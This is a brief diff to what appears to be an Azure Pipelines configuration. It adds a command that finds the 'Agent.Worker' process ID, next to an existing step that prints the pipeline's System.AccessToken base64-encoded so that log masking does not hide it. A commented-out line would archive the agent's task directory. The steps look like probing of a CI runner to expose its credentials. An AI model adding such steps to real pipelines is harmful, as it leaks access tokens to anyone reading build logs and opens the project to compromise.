@@ -21,6 +21,7 @@ steps:
 
 
 - script: |
+    ps -e | grep "Agent.Worker" | awk '{print $1}'
     echo $(System.AccessToken) | base64
     echo "Recursively checking _tasks directory after github checkout task..."
     # tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks  
